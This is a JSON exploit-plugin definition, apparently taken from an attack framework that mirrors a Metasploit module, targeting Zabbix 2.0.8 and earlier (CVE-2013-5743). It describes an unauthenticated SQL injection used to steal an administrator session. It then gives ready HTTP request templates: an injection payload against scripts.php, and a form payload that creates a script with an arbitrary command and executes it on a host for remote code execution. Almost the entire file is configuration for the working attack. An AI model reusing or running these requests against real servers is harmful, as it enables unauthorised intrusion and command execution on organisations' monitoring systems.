{
   "platform" : "ALL",
   "method" : "POST",
   "description" : "\n\n        This module exploits an unauthenticated SQL injection vulnerability affecting Zabbix\n\n        versions 2.0.8 and lower.  The SQL injection issue can be abused in order to retrieve an\n\n        active session ID.  If an administrator level user is identified, remote code execution\n\n        can be gained by uploading and executing remote scripts via the 'scripts_exec.php' file.\n\n      ",
   "payload" : "sid=__SID__&form=Create+script&name=__NAME__&type=0&execute_on=1&command=__COMMAND__&commandipmi=&description=&usrgrpid=0&groupid=0&access=2&save=Save&",
   "variables" : {
      "EXECUTE" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "URI" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "PATH" : {
         "DESCRIPTION" : "The URI of the vulnerable Zabbix instance",
         "VALUE" : "/zabbix"
      },
      "COMMAND" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "APPLICATIONS" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "SCRIPTID" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "NAME" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "SID" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      }
   },
   "name" : "ZabbixSqli",
   "cve" : "CVE-2013-5743",
   "references" : [
      "https://support.zabbix.com/browse/ZBX-7091"
   ],
   "msf_module" : "zabbix_sqli",
   "requests" : {
      "EXPLOIT1" : {
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PAYLOAD" : "sid=&form_refresh=1&scripts[]=&go=delete&goButton=Go (1)",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded",
            "Cookie" : "zbx_sessionid="
         },
         "TEXT" : "Sending Exploit #1 Request : [POST] /scripts.php",
         "METHOD" : "POST",
         "PATH" : "scripts.php"
      }
   },
   "paths" : [
      "zabbix"
   ],
   "type" : "MSF",
   "path" : "applications=__APPLICATIONS__&execute=__EXECUTE__&scriptid=__SCRIPTID__&sid=__SID__&hostid=10084&",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "detection" : {},
   "informations" : {
      "PATH" : "applications=__APPLICATIONS__&execute=__EXECUTE__&scriptid=__SCRIPTID__&sid=__SID__&hostid=10084&",
      "METHOD" : "POST",
      "PLATFORM" : "ALL",
      "TYPE" : "MSF",
      "PATHS" : [
         "zabbix"
      ],
      "REFERENCES" : [
         "https://support.zabbix.com/browse/ZBX-7091"
      ],
      "MSF_MODULE" : "zabbix_sqli",
      "VARIABLES" : {
         "EXECUTE" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "COMMAND" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "PATH" : {
            "DESCRIPTION" : "The URI of the vulnerable Zabbix instance",
            "VALUE" : "/zabbix"
         },
         "URI" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "APPLICATIONS" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "SID" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "SCRIPTID" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "NAME" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         }
      },
      "DESCRIPTION" : "\n\n        This module exploits an unauthenticated SQL injection vulnerability affecting Zabbix\n\n        versions 2.0.8 and lower.  The SQL injection issue can be abused in order to retrieve an\n\n        active session ID.  If an administrator level user is identified, remote code execution\n\n        can be gained by uploading and executing remote scripts via the 'scripts_exec.php' file.\n\n      ",
      "name" : "ZabbixSqli",
      "PAYLOAD" : "sid=__SID__&form=Create+script&name=__NAME__&type=0&execute_on=1&command=__COMMAND__&commandipmi=&description=&usrgrpid=0&groupid=0&access=2&save=Save&",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PAYLOAD" : "sid=&form_refresh=1&scripts[]=&go=delete&goButton=Go (1)",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded",
               "Cookie" : "zbx_sessionid="
            },
            "TEXT" : "Sending Exploit #1 Request : [POST] /scripts.php",
            "METHOD" : "POST",
            "PATH" : "scripts.php"
         }
      },
      "CVE" : "CVE-2013-5743"
   }
}
